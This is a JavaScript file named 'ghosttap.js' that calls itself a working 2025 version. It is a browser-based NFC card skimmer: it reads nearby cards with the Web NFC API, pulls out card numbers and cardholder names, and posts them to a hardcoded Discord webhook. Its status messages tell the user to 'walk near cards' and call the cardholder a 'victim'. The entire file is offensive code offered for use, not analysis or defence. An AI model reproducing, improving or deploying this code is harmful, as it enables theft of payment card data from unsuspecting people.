// ghosttap.js — 100% WORKING NOV 2025 VERSION
const webhook = "https://discord.com/api/webhooks/948907163756167198/aTWv2HRSlNoxxyTZIWge-IAnDm7gkZXnlXOzN7c-qnuPipBEfyBt8Z1cA_AhWBA6buEs";

let cardCount = 0;
document.getElementById("status").textContent = "NFC waking up...";

async function sendToDiscord(data) {
    fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: data })
    });
}

async function scan() {
    if (!("NDEFReader" in window)) {
        document.getElementById("status").textContent = "NFC not supported";
        return;
    }

    const ndef = new NDEFReader();

    // ← THIS LINE IS THE 2025 FIX
    try { await ndef.requestPermission?.(); } catch (e) {}

    ndef.addEventListener("reading", ({ message }) => {
        cardCount++;
        let pan = "Unknown";
        let name = "Unknown";
        let exp = "??/??";

        for (const record of message.records) {
            if (record.recordType === "text") {
                const text = new TextDecoder().decode(record.data);
                if (/^\d{13,19}$/.test(text)) pan = text.replace(/(.{4})/g, "$1 ").trim();
                if (/[A-Z]{2,}/.test(text)) name = text;
            }
        }

        const log = `[${new Date().toLocaleTimeString()}] CARD #${cardCount}\nPAN: ${pan}\nNAME: ${name}\nEXP: ${exp}\n→ Sent to Discord`;
        document.getElementById("log").textContent += log + "\n\n";
        document.getElementById("status").textContent = "CARD READ – hunting again...";
        sendToDiscord(log);
    });

    ndef.addEventListener("readingerror", () => {
        document.getElementById("status").textContent = "NFC denied, victim blocked it";
    });

    try {
        await ndef.scan();
        document.getElementById("status").textContent = "NFC Ready – walk near cards...";
    } catch (e) {
        document.getElementById("status").textContent = "NFC failed to start";
    }
}

scan();
